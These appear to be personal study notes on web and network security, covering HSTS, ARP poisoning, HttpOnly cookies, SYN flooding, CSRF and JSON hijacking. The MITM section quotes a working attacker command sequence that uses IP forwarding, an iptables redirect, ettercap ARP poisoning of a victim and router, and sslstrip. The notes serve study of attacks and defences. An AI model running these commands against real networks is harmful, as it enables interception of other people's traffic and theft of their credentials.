* http://blog.codeclimate.com/blog/2013/03/27/rails-insecure-defaults/

__HSTS header__
https://gist.github.com/bartekn/6924685

`Strict-Transport-Security: max-age=31536000`

> HTTP Strict Transport Security (HSTS) is an opt-in security enhancement that is specified by a web application through the use of a special response header. Once a supported browser receives this header that browser will prevent any communications from being sent over HTTP to the specified domain and will instead send all communications over HTTPS. It also prevents HTTPS click through prompts on browsers.

### MITM attacks

> First I turned IP forwarding on so that my computer can act as a router and route traffic to other destinations: 
attacker@linux:/#: echo 1 > /proc/sys/net/ipv4/ip_forward 
I setup setup my firewall tables to NAT all incoming TCP traffic received over port 80 to be redirected out port 10000:
attacker@linux:/#: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000 
Then, I used ettercap to perform ARP poisoning on the victim's router so that all traffic being sent to my victim will first be sent to me: 
attacker@linux:/#: ettercap -Tq -i eth0 -M arp:remote /victim's IP/ /router's IP/ 
I used the python program SSLstrip that Moxie Marlinspike created to make the HTTPS to HTTP substitutions and keep track of the changes make: 
attacker@linux:/#: python sslstrip.py -a

__ARP__

http://www.watchguard.com/infocenter/editorial/135324.asp

1. An ARP Request. Computer A asks the network, "Who has this IP address?"
2. An ARP Reply. Computer B tells Computer A, "I have that IP. My MAC address is [whatever it is]."
3. A Reverse ARP Request (RARP). Same concept as ARP Request, but Computer A asks, "Who has this MAC address?"
4. A RARP Reply. Computer B tells Computer A, "I have that MAC. My IP address is [whatever it is]"

ARP poisoning
* The hacker begins by sending a malicious ARP "reply" (for which there was no previous request) to your router. ( router thinks the hacker's computer is your computer)
* Next, the hacker sends a malicious ARP reply to your computer, associating his MAC Address with 192.168.0.1.  (your machine thinks the hacker's computer is your router)

Aircrack tool: 
* http://www.aircrack-ng.org/
* http://www.irongeek.com/i.php?page=videos/bsideslasvegas2013/2-2-6-the-slings-and-arrows-of-open-source-security-tod-beardsley-and-mister-x

__HttpOnly Cookie__

https://www.owasp.org/index.php/HttpOnly

Attempts to avoid XSS to access cookie even if a user is exposed to the XSS.

### DDOS

__SYN Flooding__ - http://tools.ietf.org/html/rfc4987 

### CSRF 

http://haacked.com/archive/2009/04/02/anatomy-of-csrf-attack.aspx/
> In general, the standard approach to mitigating CSRF attacks is to render a “canary” in the form (typically a hidden input) that the attacker couldn’t know or compute. When the form is submitted, the server validates that the submitted canary is correct. Now this assumes that the browser is trusted since the point of the attack is to get the general public to misuse their own browser’s authority.
It turns out this is mostly a reasonable assumption since browsers do not allow using XmlHttp to make a cross-domain GET request. This makes it difficult for the attacker to obtain the canary using the current user’s credentials. 

__JSON response__
http://haacked.com/archive/2009/06/25/json-hijacking.aspx/
> The bad guy has tricked the victim’s browser to issue a request for the JSON containing sensitive information using the browser’s credentials (aka the auth cookie). This loads the JSON array as executable JavaScript and now the bad guy has access to this data.
> Well the bad guy is changing the prototype for Object using the special __defineSetter__ method which allows overriding what happens when a property setter is being called.

